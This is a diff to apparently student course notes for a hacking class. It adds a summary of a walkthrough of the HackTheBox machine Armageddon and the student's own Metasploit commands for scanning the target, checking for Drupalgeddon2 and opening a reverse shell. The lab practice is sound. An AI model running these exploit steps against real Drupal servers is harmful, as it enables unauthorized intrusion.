@@ -192,7 +192,41 @@ Solutions for week five [assignments](https://terokarvinen.com/2021/hakkerointi-
 
 ## c) Identify 1-3 walkthrough(s)
 
-TBA.
+- [Armageddon](https://www.youtube.com/watch?v=ChDLsU1Uwl8)
+  - Youtube video by WuDaDaDANG
+  - Tools used
+    - NMAP
+    - drupalageddon2 exploit
+    - PHP in memory reverse shell
+  - Own testing
+    - I opened up Metasploit and scanned the target with nmap
+
+      ```shell
+      sudo msfconsole
+      db_nmap -A -T4 10.10.10.233
+      ```
+
+    - found same services as shown in the walktrough
+    - I wanted to check if the target is vulnerable to Drupalgeddon2 exploit
+
+      ```shell
+      search druplageddon2
+      use 0
+      set RHOSTS 10.10.10.233
+      check
+      ```
+
+    - Metasploit told me that the target was vulnerable so I wanted to try if I could get a reverse shell to target
+
+      ```shell
+      set LHOST 10.10.14.95
+      exploit
+      ```
+
+    - I had reverse shell access to the target server
+
+      ![drupalgeddon2](./img/0_drupalgeddon.png)
+
 
 ---
 
@@ -224,3 +258,4 @@ TBA.
 - [HackTheBox.eu, Spectra](https://app.hackthebox.eu/machines/Spectra)
 - [HackTheBox.eu, Armageddon](https://app.hackthebox.eu/machines/Armageddon)
 - [HackTheBox.eu, Love](https://app.hackthebox.eu/machines/Love)
+- [Youtube.com, Armageddon by WuDaDaDANG](https://www.youtube.com/watch?v=ChDLsU1Uwl8)
